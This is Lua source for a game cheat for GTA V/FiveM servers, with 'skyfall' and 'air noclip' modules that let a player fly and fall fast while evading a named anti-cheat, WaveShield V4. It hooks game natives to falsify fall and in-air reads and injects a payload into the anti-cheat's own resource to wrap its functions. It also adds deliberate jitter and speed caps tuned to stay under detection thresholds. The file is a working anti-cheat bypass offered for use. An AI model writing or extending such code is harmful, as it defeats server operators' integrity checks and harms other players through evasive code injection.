    K.lastFallAt = O.now()
    K.idleAfter = O.jitter(IDLE_MS, 0.3)
    K.wasFalling = false
    K.fallStartedAt = 0
    K.skipWarmup = false
    frame = 4          -- the first falling tick samples ragdoll/parachute
    ragdoll = false
    parachute = 0

    local ok, why = ensureReadLayer()
    if not ok then
        K.reason = "no read layer"
        K.layer = "none"
        O.log("skyfall refused: %s", tostring(why))
        return false
    end

    -- A skyfall session is a noclip-family event. The budget reserves one
    -- strike for a real-world anomaly and refuses a second session inside the
    -- window. The layer is removed again if the budget refuses, so a refused
    -- arm leaves nothing behind.
    if not B.spend("noclip") then
        K.stats.refused = K.stats.refused + 1
        K.stop("budget")
        return false
    end

    -- Read the real fall state before opening the gate. If the operator arms
    -- mid-fall, the very first guard read is already covered; there is no
    -- one-tick window where the hook is installed but still answers false.
    local okFall, falling = pcall(IsPedFalling, ped)
    if not okFall then
        K.stop("fall read failed")
        return false
    end
    falling = falling and true or false

    K.falling = falling
    -- Arming mid-air means the guard's 1 s cache has already had time to see
    -- the fall; skip the warmup instead of slowing a real 30 m/s descent.
    -- IsPedFalling alone is not enough: the speedHack ceiling is keyed on
    -- isEntityInAir, so a falling-but-not-in-air ped must still warm up.
    -- The negative sentinel makes now - fallStartedAt > WARMUP_MS even at
    -- game timer zero.
    local okAir, inAir = pcall(IsEntityInAir, ped)
    inAir = okAir and inAir and true or false
    K.skipWarmup = falling and inAir
    K.wasFalling = falling
    K.fallStartedAt = K.skipWarmup and -WARMUP_MS or 0
    K.untilAt = clock() + GATE_SECONDS
    K.fallGateUntil = (falling and inAir) and (clock() + FALL_GRACE) or 0
    K.active = true
    K.reason = "armed"

    if K.layer == "stage-b" and stageB.event then
        pcall(TriggerEvent, stageB.event, STAGE_B_WINDOW)
        stageB.next = O.now() + STAGE_B_PULSE
    end

    K.stats.sessions = K.stats.sessions + 1
    O.log("skyfall armed (%s)", K.layer)
    if K.onChange then pcall(K.onChange, true) end
    return true
end

function K.stop(reason)
    if not K.active and not hookInstalled and not stageB.injected then
        K.reason = reason or "off"
        return false
    end

    K.active = false
    K.layer = "none"
    K.falling = false
    K.untilAt = 0
    K.fallGateUntil = 0
    K.holdUntil = 0
    K.holdReason = nil
    K.reason = reason or "off"
    K.ramped = false
    K.vx, K.vy, K.vz = 0.0, 0.0, 0.0
    K.wasFalling = false
    K.fallStartedAt = 0
    K.skipWarmup = false
    ragdoll = false
    parachute = 0

    removeHook()

    -- Close the guard-side gate immediately. The wrapper stays in place but
    -- inert; it is cheaper and less visible than a second injection whose only
    -- job is to restore a function pointer.
    if stageB.event then
        pcall(TriggerEvent, stageB.event, 0)
    end

    if K.onChange then pcall(K.onChange, false) end
    O.log("skyfall off (%s)", K.reason)
    return true
end

function K.disable()
    return K.stop("panic")
end

function K.isActive()
    return K.active == true
end

-- ---------------------------------------------------------------------------
-- TICK
--
-- Runs from O.every(), which jitters the period. Zero native calls when the
-- feature is off: the first line returns. While armed, the reads are the ones
-- the guard itself already makes (falling, ragdoll, parachute, camera) plus
-- the one write the doctrine needs: a real velocity.
-- ---------------------------------------------------------------------------
-- A stop edge (death, vehicle, parachute, ped gone) must not remove the
-- 423 cover before the guard's 1 s isPedFalling cache has refreshed. Stop
-- writing velocity now, hold the read layer for FALL_GRACE, then stop.
local function holdOrStop(reason)
    if K.layer == "none" then
        K.stop(reason)
        return
    end
    if K.holdUntil ~= 0 then return end
    K.holdUntil = clock() + FALL_GRACE
    K.holdReason = reason
    K.untilAt = clock() + GATE_SECONDS
    K.fallGateUntil = clock() + FALL_GRACE
    K.ramped = false
    K.vx, K.vy, K.vz = 0.0, 0.0, 0.0
    K.wasFalling = false
    O.log("skyfall cover hold (%s)", reason)
end

function K.tick(now)
    if not K.active then return end
    now = now or O.now()

    if K.holdUntil ~= 0 then
        if clock() > K.holdUntil then
            K.stop(K.holdReason or "state")
        end
        return
    end

    local ped = O.Ctx.ped
    if ped == 0 then
        holdOrStop("ped gone")
        return
    end

    if O.Ctx.dead or O.Ctx.inVehicle then
        holdOrStop(O.Ctx.dead and "dead" or "vehicle")
        return
    end

    K.ped = ped
    K.falling = IsPedFalling(ped) and true or false
    local inAir = IsEntityInAir(ped) and true or false
    K.untilAt = clock() + GATE_SECONDS

    if K.falling and not K.wasFalling then
        K.fallStartedAt = now
    end
    K.wasFalling = K.falling

    if K.falling and inAir then
        K.lastFallAt = now
        -- The guard's isPedFalling cache can still be true for one update
        -- after landing. Keep the 423 answer true through that edge; a
        -- falling flag without IsEntityInAir must not refresh it.
        K.fallGateUntil = clock() + FALL_GRACE
    elseif K.layer ~= "none" and (now - K.lastFallAt) > K.idleAfter then
        -- The idle clock is the last genuine in-air fall, not a glitchy
        -- IsPedFalling flag, so the hook still sleeps in that state.
        sleepLayer()
    end

    -- Tier B is kept alive with a jittered pulse. If this chunk dies, the
    -- last pulse expires on its own; there is no permanent open gate.
    if K.layer == "stage-b" and stageB.event then
        if now >= stageB.next then
            pcall(TriggerEvent, stageB.event, STAGE_B_WINDOW)
            stageB.next = now + O.jitter(STAGE_B_PULSE, 0.25)
        end
    end

    if not K.falling then
        -- A stale parachute/ragdoll/ramp sample from the previous fall must
        -- not abort the next dive during its first four ticks.
        parachute = 0
        ragdoll = false
        K.ramped = false
        K.skipWarmup = false
        return
    end

    -- Wake a sleeping read layer on the falling edge, before any gate that
    -- could return early. The guard's fall bypass is keyed on IsPedFalling,
    -- not on IsEntityInAir; the hook must cover that state too.
    if K.layer == "none" then
        local ok, why = ensureReadLayer()
        if not ok then
            K.stop("no read layer")
            return
        end
        if K.layer == "stage-b" and stageB.event then
            pcall(TriggerEvent, stageB.event, STAGE_B_WINDOW)
            stageB.next = now + O.jitter(STAGE_B_PULSE, 0.25)
        end
        O.log("skyfall layer awake (%s)", K.layer)
    end

    -- The guard's speedHack only grants the 60 m/s ceiling when its cached
    -- isEntityInAir is true. If the native disagrees with IsPedFalling, do not
    -- add speed: the default on-foot ceiling is 14 m/s and the dive would
    -- strike.
    if not inAir then
        parachute = 0
        ragdoll = false
        K.ramped = false
        K.skipWarmup = false
        return
    end

    -- Ragdoll and parachute are checked every fifth tick. Both are real states
    -- owned by the game; overriding them would be a visible physics lie. If
    -- either is present, the fall is left alone.
    frame = frame + 1
    if frame % 5 == 0 then
        ragdoll = IsPedRagdoll(ped) and true or false
        local ok, state = pcall(GetPedParachuteState, ped)
        parachute = (ok and type(state) == "number") and state or 0
    end

    if parachute > 0 then
        holdOrStop("parachute")
        return
    end
    if ragdoll then return end

    -- Camera-relative steering. The horizontal component is normalised so a
    -- steep look angle does not silently remove lateral control; the vertical
    -- component is independent of the camera pitch sign.
    local rot = GetGameplayCamRot(2)
    local dir = O.rotToDir(rot)
    local hx, hy = dir.x, dir.y
    local hlen = math.sqrt(hx * hx + hy * hy)
    if hlen > 0.001 then
        hx, hy = hx / hlen, hy / hlen
    else
        hx, hy = 0.0, 0.0
    end

    -- Collision is deliberately out of scope: the operator already runs a
    -- no-collision state. The module never brakes, freezes or inspects the
    -- floor, which is also why it cannot leave a physics-integrity signature
    -- at low altitude.

    if not K.ramped then beginFall(now) end

    -- Per-tick target jitter: a perfectly constant terminal speed is a machine
    -- signature. The excursion is well inside a human fall, and the terminal
    -- pair stays under the guard's 60.0 m/s falling ceiling.
    local targetDive = K.termDive + O.range(-0.6, 0.6)
    local targetHoriz = K.termHoriz + O.range(-0.5, 0.5)
    local targetVx = hx * targetHoriz
    local targetVy = hy * targetHoriz
    local targetVz = -targetDive

    -- Ballistic entry with capped acceleration. beginFall seeded the real
    -- fall velocity; this bends it toward the terminal at a rate a server-side
    -- physics check can accept, instead of a one-frame step to 36 m/s.
    local dt = 0.03
    if K.lastTickAt and now > K.lastTickAt then
        dt = math.min(0.1, (now - K.lastTickAt) / 1000.0)
    end
    K.lastTickAt = now

    local stepV = MAX_FALL_ACCEL * dt
    local stepH = MAX_AIR_ACCEL * dt

    local dv = targetVz - K.vz
    if dv > stepV then
        K.vz = K.vz + stepV
    elseif dv < -stepV then
        K.vz = K.vz - stepV
    else
        K.vz = targetVz
    end

    local dx = targetVx - K.vx
    if dx > stepH then
        K.vx = K.vx + stepH
    elseif dx < -stepH then
        K.vx = K.vx - stepH
    else
        K.vx = targetVx
    end

    local dy = targetVy - K.vy
    if dy > stepH then
        K.vy = K.vy + stepH
    elseif dy < -stepH then
        K.vy = K.vy - stepH
    else
        K.vy = targetVy
    end

    -- The guard's actorLoop refreshes isEntityInAir every 1000 ms. During the
    -- first second of a fresh fall the cached value may still be false, which
    -- puts speedHack on its 14 m/s on-foot ceiling. Stay below it until the
    -- cache has necessarily refreshed; after that the 60 m/s falling ceiling
    -- applies and the ramp continues from here.
    if now - K.fallStartedAt < WARMUP_MS then
        local warm = math.sqrt(K.vx * K.vx + K.vy * K.vy + K.vz * K.vz)
        if warm > WARMUP_SPEED then
            local scale = WARMUP_SPEED / warm
            K.vx, K.vy, K.vz = K.vx * scale, K.vy * scale, K.vz * scale
        end
    end

    local vx, vy, vz = K.vx, K.vy, K.vz
    local speed = math.sqrt(vx * vx + vy * vy + vz * vz)
    if speed > SPEED_CAP then
        local scale = SPEED_CAP / speed
        vx, vy, vz = vx * scale, vy * scale, vz * scale
        K.vx, K.vy, K.vz = vx, vy, vz
    end

    local wrote = pcall(SetEntityVelocity, ped, vx, vy, vz)
    if not wrote then
        K.stop("velocity write failed")
        return
    end
    K.stats.ticks = K.stats.ticks + 1
end

-- The scheduler owns the cadence. 30 ms nominal, jittered by O.every(); the
-- first phase is zero so the task is eligible immediately after arming.
O.every("skyfall", 30, K.tick, 0)

return K

end)(O,S,B)

-- ---------------------------------------------------------------------------
-- PART: 16_air_noclip.lua
-- ---------------------------------------------------------------------------
local N = (function(O,S,B)
-- ============================================================================
-- VANGUARD / 16 AIR NOCLIP
-- ----------------------------------------------------------------------------
-- Doctrine (L4): this is not a fall and it is not a position write. It is the
-- freefall task at ground level, gravity disabled, with a real velocity written
-- every tick. The character keeps a skydive pose and floats; the engine owns
-- the body, so every position sample is continuous and every physics sample is
-- a velocity the engine itself integrated.
--
-- Design reference: doctrine/10_AIR_NOCLIP.md.
--
-- The reference guard (WaveShield V4) has five facts that decide whether this
-- movement is legitimate:
--   * the main noclip branch is off while isPedFalling is true;
--   * the fall branch accepts GetIsTaskActive(ped, 423) as the real-fall token;
--   * actorLoop caches isEntityInAir and isPedFalling for 1000 ms;
--   * initializer.lua copies IsPedFalling/IsEntityInAir into WaveShield.Native
--     at startup, and actorLoop reads those aliases, not _G;
--   * the on-foot speed ceiling is 14.0 m/s, the falling ceiling 60 m/s.
--
-- Pose: TASK_PLAY_ANIM with the base-game skydive@freefall dictionary and the
-- free_forward clip. This is a pose, not a physics task: it has no landing
-- transition, no automatic parachute and no forced velocity. TASK_SKY_DIVE is
-- deliberately rejected at ground level because live feedback showed it
-- landing, sliding, standing up and deploying a parachute immediately.
--
-- Three layers, strongest genuine state first:
--
--   task    A task (if one is present) really makes all three reads true. No
--           hook at all. TaskPlayAnim does not set 423, so in practice the
--           native layer below is the normal path.
--   native  A scoped Susano.HookNative for each read that is still false. The
--           callback makes no native call: cached fields plus os.clock only.
--   stage-b A payload injected into the guard resource through
--           Susano.InjectResource, used only when the native hook is missing or
--           refused. The payload has no Susano.* reference and is armed by a
--           random local event with a 2.5 s window. It wraps _G.GetIsTaskActive,
--           _G.IsPedFalling and _G.IsEntityInAir, and also replaces
--           WaveShield.Native.IsPedFalling / .IsEntityInAir when that alias
--           table exists and is mutable. If the aliases are absent or
--           immutable, Tier B alone covers only task 423; falling/in-air must
--           come from the genuine task or Tier A.
--
-- Movement is deliberately slow at first: for 1200 ms after arming the written
-- speed stays below the guard's 14.0 m/s on-foot ceiling while its 1000 ms
-- caches refresh. After that the 45 m/s cap applies (teleport is 50 m/s,
-- speedHack 60 m/s). No coordinate write, no freeze, no collision write, no
-- health/proof/visibility write, no state bag and no server event.
--
-- Native hashes verified against this repo's natives.json:
--   PLAYER_PED_ID            0xD80958FC74E988A6
--   DOES_ENTITY_EXIST        0x7239B21A38F536BA
--   IS_PED_IN_ANY_VEHICLE    0x997ABD671D25CA0B
--   IS_PED_DEAD_OR_DYING     0x3317DEDB88C95038
--   GET_GAME_TIMER           0x9CD27B0045628463
--   TASK_SKY_DIVE            0x601736CFE536B0A0  (Ped) -> void, rejected
--   TASK_PLAY_ANIM           0xEA47FE3719165B94  pose, skydive@freefall/free_forward
--   REQUEST_ANIM_DICT        0xD3BD40951412FEF6  (char*)
--   HAS_ANIM_DICT_LOADED     0xD031A9162D01088C  (char*) -> BOOL
--   REMOVE_ANIM_DICT         0xF66A602F829E2A06  (char*)
--   CLEAR_PED_TASKS          0xE1EF3C1216AFF2CD  (Ped) -> void
--   SET_PED_GRAVITY          0x9FF447B6B6AD960A  (Ped, BOOL) -> void
--   SET_ENTITY_HAS_GRAVITY   0x4A4722448F18EEF5  entity alternative, not called
--   SET_ENTITY_VELOCITY      0x1C99BB7B6E96D16F  (Entity, float, float, float)
--   GET_GAMEPLAY_CAM_ROT     0x837765A25378F0BB  (int) -> Vector3
--   IS_CONTROL_PRESSED       0xF3A21BCD95725A4A  (int, int) -> BOOL
--   IS_PED_FALLING           0xFB92A102F1C4DFA3  (Ped) -> BOOL
--   IS_ENTITY_IN_AIR         0x886E37EC497200B6  (Entity) -> BOOL
--   GET_IS_TASK_ACTIVE       0xB0760331C7AA4155  (Ped, int) -> BOOL
--   IS_PED_RAGDOLL           0x47E4E977581C5B55  (Ped) -> BOOL
--   GET_PED_PARACHUTE_STATE  0x79CFD9827CC979B6  (Ped) -> int
--
-- SET_ENTITY_GRAVITY is not in natives.json: never call it. The ped-native is
-- SET_PED_GRAVITY; SET_ENTITY_HAS_GRAVITY is the entity alternative if the ped
-- flag is ignored by the runtime. TASK_SKY_DIVE has one documented parameter
-- (Ped); NativeDB mentions an undocumented second BOOL p1, so it is not used.
-- The pose is TASK_PLAY_ANIM with flags
-- AF_LOOPING|AF_HOLD_LAST_FRAME|AF_IGNORE_GRAVITY = 1|2|2048 = 2051,
-- duration -1, playbackRate 1.0, locks false. The dictionary and clip are the
-- base-game skydive@freefall / free_forward pair listed by FiveForge
-- (https://five-forge.com/gta/animations/skydive@freefall, 6 clips); this is
-- evidence, not a guessed clip.
-- ============================================================================

local N = {}

local TASK_LEGIT_FALL = 423

local H_TASK = 0xB0760331C7AA4155 -- GET_IS_TASK_ACTIVE
local H_FALL = 0xFB92A102F1C4DFA3 -- IS_PED_FALLING
local H_AIR = 0x886E37EC497200B6 -- IS_ENTITY_IN_AIR

-- Timing. COVER_DELAY_MS is the genuine-state settle window after arming.
local COVER_DELAY_MS = 300
local GATE_SECONDS = 1.5
local FALL_GRACE = 1.2
local WARMUP_MS = 1200
local WARMUP_SPEED = 13.5
local STAGE_B_PULSE = 1500
local STAGE_B_WINDOW = 2.5
local POSE_LOAD_MS = 1200

-- Base-game freefall pose. The dictionary has free_back, free_forward,
-- free_forward_add, free_forward_anim, free_left and free_right; free_forward
-- is the forward freefall pose shown in the operator's reference capture.
local ANIM_DICT = "skydive@freefall"
local ANIM_CLIP = "free_forward"
local ANIM_FLAGS = 1 | 2 | 2048 -- AF_LOOPING | AF_HOLD_LAST_FRAME | AF_IGNORE_GRAVITY

-- Movement profile.
local FWD_SPEED = 28.0
local STRAFE_SPEED = 20.0
local CAM_VERT_MAX = 15.0
local EXPLICIT_VERT = 12.0
local SPEED_CAP = 45.0
local ACCEL = 18.0

-- Controls. 32/33/34/35 are Z/S/Q/D, 22 is Space, 36 is Ctrl.
local CTL_FWD, CTL_BACK, CTL_LEFT, CTL_RIGHT = 32, 33, 34, 35
local CTL_UP, CTL_DOWN = 22, 36

N.active = false
N.ped = 0
N.layer = "none"
N.reason = "off"
N.onChange = nil
N.stats = { sessions = 0, ticks = 0, refused = 0, holds = 0, refunds = 0 }

N.vx, N.vy, N.vz = 0.0, 0.0, 0.0
N.armAt = 0
N.posePending = false
N.poseAt = 0
N.poseApplied = false
N.lastTickAt = 0
N.untilAt = 0
N.fallGateUntil = 0
N.holdUntil = 0
N.holdReason = nil
N.warmupUntil = 0
N.taskAt = 0
N.taskStarted = false
N.gravityOff = false
N.hooks = {}
N.stageB = { event = nil, injected = false, next = 0 }
N.coverChecked = false
local motionStopped = false
local stageBResource = nil

-- ---------------------------------------------------------------------------
-- WATCHDOG CLOCK. CPU time, not wall time: it keeps moving if this chunk is
-- unloaded, so every repair fails closed. Same contract as 15_skyfall.lua.
-- ---------------------------------------------------------------------------
local function clock()
    if type(os) ~= "table" then return -1.0e9 end

    local ok, value = pcall(os.clock)
    if ok and type(value) == "number" then return value end

    local ok2, value2 = pcall(os.time)
    if ok2 and type(value2) == "number" then return value2 end

    return -1.0e9
end

-- A failed or immediately-aborted session must not consume the 10 s noclip
-- token. The operator's first live test showed the old TaskSkyDive landing,
-- auto-parachuting and consuming the budget, which made the toggle look
-- broken for ten seconds. A short failure refunds; a real session and an
-- operator stop keep the budget.
local REFUND_REASONS = {
    ["task failed"] = true,
    ["gravity failed"] = true,
    ["pose failed"] = true,
    ["parachute"] = true,
    ["no cover"] = true,
    ["velocity write failed"] = true,
    ["ped gone"] = true,
    ["dead"] = true,
    ["vehicle"] = true,
}

local function refundBudget()
    if type(B) ~= "table" or type(B.refund) ~= "function" then return false end
    local ok, refunded = pcall(B.refund, "noclip")
    if ok and refunded then
        N.stats.refunds = N.stats.refunds + 1
        return true
    end
    return false
end

-- ---------------------------------------------------------------------------
-- TIER A: scoped native hooks. Callbacks are native-free. They answer only for
-- the exact local tuple and only while both the liveness gate and the fall
-- cache gate are open. Everything else passes through untouched.
-- ---------------------------------------------------------------------------
local function gateOpen()
    local deadline = N.untilAt
    if N.fallGateUntil < deadline then deadline = N.fallGateUntil end
    return deadline > 0 and clock() <= deadline
end

local function onTaskActive(ped, taskIndex)
    if N.active and ped == N.ped and taskIndex == TASK_LEGIT_FALL and gateOpen() then
        return false, true
    end
    return true
end

local function onPedFalling(ped)
    if N.active and ped == N.ped and gateOpen() then
        return false, true
    end
    return true
end

local function onEntityInAir(entity)
    if N.active and entity == N.ped and gateOpen() then
        return false, true
    end
    return true
end

local HOOK_CALLBACK = {
    [H_TASK] = onTaskActive,
    [H_FALL] = onPedFalling,
    [H_AIR] = onEntityInAir,
}

local function removeHooks()
    local api = rawget(_G, "Susano")
    if type(api) == "table" and type(api.UnhookNative) == "function" then
        for hash in pairs(N.hooks) do
            pcall(api.UnhookNative, hash)
        end
    end
    N.hooks = {}
end

local function installHooks(need)
    if type(O) ~= "table" or type(O.has) ~= "function"
        or not O.has("HookNative", "UnhookNative") then
        return false, "HookNative unavailable"
    end

    local api = rawget(_G, "Susano")
    if type(api) ~= "table" then return false, "HookNative unavailable" end

    local done = {}
    for i = 1, #need do
        local hash = need[i]
        -- Clear a stale trampoline from an executor reload before installing.
        pcall(api.UnhookNative, hash)

        local ok, result = pcall(api.HookNative, hash, HOOK_CALLBACK[hash])
        if not ok or result == false then
            -- Never leave half a layer behind: Tier B must not stack on it.
            for j = 1, #done do pcall(api.UnhookNative, done[j]) end
            return false, "HookNative failed"
        end
        done[#done + 1] = hash
    end

    for i = 1, #done do N.hooks[done[i]] = true end
    return true
end

-- ---------------------------------------------------------------------------
-- TIER B: guard-side read repair. The payload has no Susano.* reference. It is
-- idempotent through a marker in the guard state; a guard restart removes the
-- marker with the resource and the next arm injects again. The event name is
-- random and never written to a global.
--
-- V4's actorLoop reads WaveShield.Native.IsPedFalling/IsEntityInAir, copied at
-- startup by initializer.lua. The payload replaces those aliases too when the
-- table exists and the fields are mutable. If the table is absent or
-- immutable, Tier A is the only cover for falling/in-air; Tier B alone then
-- covers only task 423. The payload must not claim more than that.
-- ---------------------------------------------------------------------------
local function stageBName()
    return string.format("sf_%06x", math.floor(O.int(0x100000, 0xffffff)))
end

local function stageBPayload(eventName)
    return ([[
pcall(function()
    if rawget(_G, "__sfnc") then return end
    local clock = os.clock
    if type(clock) ~= "function" then clock = os.time end
    if type(clock) ~= "function" then return end
    local expiry = -1
    AddEventHandler(%q, function(duration)
        if type(duration) == "number" and duration > 0 then
            expiry = clock() + duration
        else
            expiry = -1
        end
    end)
    local function localPed()
        local guard = rawget(_G, "WaveShield")
        if guard and type(guard.playerPed) == "number" and guard.playerPed ~= 0 then
            return guard.playerPed
        end
        return PlayerPedId()
    end
    local guardTable = rawget(_G, "WaveShield")
    local native = (guardTable and type(guardTable.Native) == "table") and guardTable.Native or nil
    local origTask = rawget(_G, "GetIsTaskActive")
    local origFall = rawget(_G, "IsPedFalling")
    local origAir = rawget(_G, "IsEntityInAir")
    local oldNativeFall = native and native.IsPedFalling or nil
    local oldNativeAir = native and native.IsEntityInAir or nil

    local function makeFall(original)
        return function(ped)
            if clock() <= expiry and ped == localPed() then return true end
            if type(original) == "function" then return original(ped) end
            return false
        end
    end
    local function makeAir(original)
        return function(entity)
            if clock() <= expiry and entity == localPed() then return true end
            if type(original) == "function" then return original(entity) end
            return false
        end
    end
    local function replaceField(tbl, key, value)
        local ok = pcall(function() tbl[key] = value end)
        -- A refused or silently ignored write leaves the original in place:
        -- Tier A is then the only cover for that read. Never claim otherwise.
        return ok and tbl[key] == value
    end

    if type(origTask) == "function" then
        _G.GetIsTaskActive = function(ped, taskIndex)
            if taskIndex == 423 and clock() <= expiry and ped == localPed() then
                return true
            end
            return origTask(ped, taskIndex)
        end
    end
    if type(origFall) == "function" then
        _G.IsPedFalling = makeFall(origFall)
    end
    if type(origAir) == "function" then
        _G.IsEntityInAir = makeAir(origAir)
    end

    -- WaveShield V4 copies IsPedFalling/IsEntityInAir into WaveShield.Native
    -- at startup and actorLoop reads those aliases. Replace the aliases too
    -- when the table/fields are mutable. The alias wrappers share the same
    -- gating logic but call their own saved original, so neither path recurses.
    -- If the table is absent or immutable, Tier A is the only cover for
    -- falling/in-air; Tier B alone then covers only task 423. This is a
    -- coverage limit, not a success claim.
    if native then
        if type(oldNativeFall) == "function" then
            replaceField(native, "IsPedFalling", makeFall(oldNativeFall))
        end
        if type(oldNativeAir) == "function" then
            replaceField(native, "IsEntityInAir", makeAir(oldNativeAir))
        end
    end
    _G.__sfnc = true
end)
]]):format(eventName)
end

local function injectStageB()
    if type(S) ~= "table" then return false, "no scanner" end
    if type(S.acs) ~= "table" then return false, "no resource list" end
    if #S.acs == 0 and type(S.scan) == "function" then pcall(S.scan) end

    local target = stageBResource
    if not target then
        for i = 1, #S.acs do
            if S.acs[i].vendor == "waveshield" then
                target = S.acs[i].resource
                break
            end
        end
    end
    if not target then return false, "no WaveShield resource" end

    if type(GetResourceState) ~= "function" then
        return false, "resource state unavailable"
    end
    local okState, state = pcall(GetResourceState, target)
    if not okState or state ~= "started" then return false, "guard not started" end

    local api = rawget(_G, "Susano")
    if type(api) ~= "table" or type(api.InjectResource) ~= "function" then
        return false, "InjectResource unavailable"
    end

    if not N.stageB.event then N.stageB.event = stageBName() end
    local code = stageBPayload(N.stageB.event)

    local ok, result
    local injectionType = api.InjectionType
    if type(injectionType) == "table" and injectionType.NEW_THREAD ~= nil then
        ok, result = pcall(api.InjectResource, target, code, injectionType.NEW_THREAD)
    else
        ok, result = pcall(api.InjectResource, target, code)
    end

    if not ok or result == false then
        return false, tostring(result or "injection failed")
    end

    stageBResource = target
    N.stageB.injected = true
    N.stageB.next = 0
    return true
end

-- ---------------------------------------------------------------------------
-- COVER. Read the genuine state after the settle window. Install a hook only
-- for a read that is false. If every read is true, the task is the state and
-- there is no hook at all.
-- ---------------------------------------------------------------------------
local function ensureCover()
    local okTask, task = pcall(GetIsTaskActive, N.ped, TASK_LEGIT_FALL)
    task = okTask and task and true or false

    local okFall, falling = pcall(IsPedFalling, N.ped)
    falling = okFall and falling and true or false

    local okAir, inAir = pcall(IsEntityInAir, N.ped)
    inAir = okAir and inAir and true or false

    if task then N.taskStarted = true end

    if task and falling and inAir then
        N.layer = "task"
        return true
    end

    local need = {}
    if not task then need[#need + 1] = H_TASK end
    if not falling then need[#need + 1] = H_FALL end
    if not inAir then need[#need + 1] = H_AIR end

    local okHook, hookWhy = installHooks(need)
    if okHook then
        N.layer = "native"
        return true
    end

    local okB, whyB = injectStageB()
    if okB then
        N.layer = "stage-b"
        if N.stageB.event then
            pcall(TriggerEvent, N.stageB.event, STAGE_B_WINDOW)
            -- NEW_THREAD injection can finish after this first pulse. Retry on
            -- the next tick (30 ms) instead of waiting a full pulse period, so
            -- an asynchronously registered handler cannot leave a 1.5 s gap.
            N.stageB.next = O.now() + 1
        end
        return true
    end

    N.layer = "none"
    return false, whyB or hookWhy
end

-- ---------------------------------------------------------------------------
-- MOTION CLEANUP. Stop the body, end the pose and restore gravity once. The
-- flag makes the hold-then-stop path idempotent.
-- ---------------------------------------------------------------------------
local function cleanupMotion()
    if motionStopped then return end
    motionStopped = true

    local ped = N.ped
    if ped ~= 0 and DoesEntityExist(ped) then
        pcall(SetEntityVelocity, ped, 0.0, 0.0, 0.0)
        pcall(ClearPedTasks, ped)
        if N.gravityOff then
            -- Restore only the ped-native that was disabled at arm. Never call
            -- SET_ENTITY_GRAVITY: it is absent from natives.json.
            pcall(SetPedGravity, ped, true)
        end
    end
    pcall(RemoveAnimDict, ANIM_DICT)

    N.gravityOff = false
    N.posePending = false
    N.poseApplied = false
    N.vx, N.vy, N.vz = 0.0, 0.0, 0.0
end

local function holdOrStop(reason)
    if N.layer == "none" then
        N.stop(reason)
        return
    end
    if N.holdUntil ~= 0 then return end

    local c = clock()
    N.holdUntil = c + FALL_GRACE
    N.holdReason = reason
    N.untilAt = c + GATE_SECONDS
    N.fallGateUntil = c + FALL_GRACE
    cleanupMotion()

    -- A Stage B gate must stay open across the hold too.
    if N.layer == "stage-b" and N.stageB.event then
        pcall(TriggerEvent, N.stageB.event, STAGE_B_WINDOW)
        N.stageB.next = O.now() + O.jitter(STAGE_B_PULSE, 0.25)
    end

    N.stats.holds = N.stats.holds + 1
    O.log("air noclip cover hold (%s)", tostring(reason))
end

-- ---------------------------------------------------------------------------
-- ARM / STOP
-- ---------------------------------------------------------------------------
function N.arm()
    if N.active then return true end

    local ped = PlayerPedId()
    if ped == 0 or not DoesEntityExist(ped) then return false end
    if IsPedInAnyVehicle(ped, false) then
        O.log("air noclip: leave the vehicle first")
        return false
    end
    if IsPedDeadOrDying(ped, true) then return false end
    local okChute, chute = pcall(GetPedParachuteState, ped)
    if okChute and type(chute) == "number" and chute > 0 then
        O.log("air noclip: parachute is open")
        return false
    end

    -- A stale trampoline or an open guard-side gate from a previous execution
    -- must not survive a refused arm either.
    removeHooks()
    if N.stageB.event then
        pcall(TriggerEvent, N.stageB.event, 0)
    end

    -- One noclip-family token per window. A refused arm leaves nothing behind.
    if not B.spend("noclip") then
        N.stats.refused = N.stats.refused + 1
        N.layer = "none"
        N.reason = "budget"
        return false
    end

    local now = O.now()
    N.ped = ped
    N.layer = "none"
    N.reason = "arming"
    N.holdUntil = 0
    N.holdReason = nil
    N.vx, N.vy, N.vz = 0.0, 0.0, 0.0
    N.lastTickAt = now
    N.taskAt = now
    N.warmupUntil = now + WARMUP_MS
    N.taskStarted = false
    N.coverChecked = false
    N.gravityOff = false
    motionStopped = false
    N.stageB.next = 0

    local c = clock()
    N.untilAt = c + GATE_SECONDS
    N.fallGateUntil = c + FALL_GRACE

    -- Gravity first: the pose is not a physics task, so the body must not
    -- integrate a fall while the animation dictionary is streaming.
    -- Verified ped-native: SET_PED_GRAVITY (PED, 0x9FF447B6B6AD960A).
    -- SET_ENTITY_GRAVITY is absent from natives.json and is never called.
    local okGravity = pcall(SetPedGravity, ped, false)
    if not okGravity then
        cleanupMotion()
        N.taskStarted = false
        N.reason = "gravity failed"
        refundBudget()
        return false
    end
    N.gravityOff = true

    -- Verified base-game freefall pose: skydive@freefall / free_forward.
    -- TaskPlayAnim has no landing transition, no auto parachute and no forced
    -- velocity, unlike TaskSkyDive at ground level.
    local okRequest = pcall(RequestAnimDict, ANIM_DICT)
    if not okRequest then
        cleanupMotion()
        N.taskStarted = false
        N.reason = "pose failed"
        refundBudget()
        return false
    end

    N.posePending = true
    N.poseAt = O.now()
    N.poseApplied = false
    N.taskStarted = false

    N.active = true
    N.armAt = O.now()
    N.reason = "armed"
    N.stats.sessions = N.stats.sessions + 1
    O.log("air noclip armed (freefall pose pending)")
    if N.onChange then pcall(N.onChange, true) end
    return true
end

function N.stop(reason)
    local wasActive = N.active
    local had = wasActive or next(N.hooks) ~= nil or N.stageB.injected
    if not had then
        N.reason = reason or "off"
        return false
    end

    local resolvedReason = reason or "off"
    local elapsed = (N.armAt > 0) and (O.now() - N.armAt) or 0
    -- A quick manual off after a broken pose is also a failed attempt; a real
    -- session (or a manual off after 1.5 s) keeps the budget.
    local quickOperator = resolvedReason == "operator" and elapsed > 0 and elapsed < 1500
    local shouldRefund = wasActive and elapsed > 0 and elapsed < 4000
        and (REFUND_REASONS[resolvedReason] == true or quickOperator)

    N.active = false
    N.layer = "none"
    N.untilAt = 0
    N.fallGateUntil = 0
    N.holdUntil = 0
    N.holdReason = nil
    N.reason = resolvedReason
    N.taskStarted = false
    N.coverChecked = false
    N.lastTickAt = 0
    N.armAt = 0
    N.vx, N.vy, N.vz = 0.0, 0.0, 0.0

    -- A second stop after a Stage B session must not write velocity or clear a
    -- task that the operator has started since. Only an active session (or a
    -- gravity flag left by it) owns motion cleanup.
    if wasActive or N.gravityOff then
        cleanupMotion()
    end
    removeHooks()

    -- Close the guard-side gate immediately; the wrapper itself stays inert.
    if N.stageB.event then
        pcall(TriggerEvent, N.stageB.event, 0)
    end
    N.stageB.next = 0
    motionStopped = false

    if shouldRefund then refundBudget() end
